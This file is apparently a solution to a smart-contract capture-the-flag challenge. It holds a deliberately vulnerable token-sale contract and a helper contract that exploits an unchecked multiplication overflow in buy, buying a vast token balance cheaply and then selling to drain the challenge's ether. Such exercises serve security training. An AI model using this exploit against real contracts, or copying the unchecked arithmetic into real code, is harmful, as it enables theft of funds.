pragma solidity ^0.4.21;

import './OtherContract.sol';

contract TokenSaleHelper is OtherContract {
    event TestTokens(uint256 tokens, uint256 price, uint256 result);

    function buy() public payable {
        require(otherContract != 0);
        TokenSaleChallenge tokenSaleChallenge = TokenSaleChallenge(otherContract);
        tokenSaleChallenge.buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458);
        tokenSaleChallenge.sell(1);
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() public payable { 
    }
}

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address /*_player*/) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}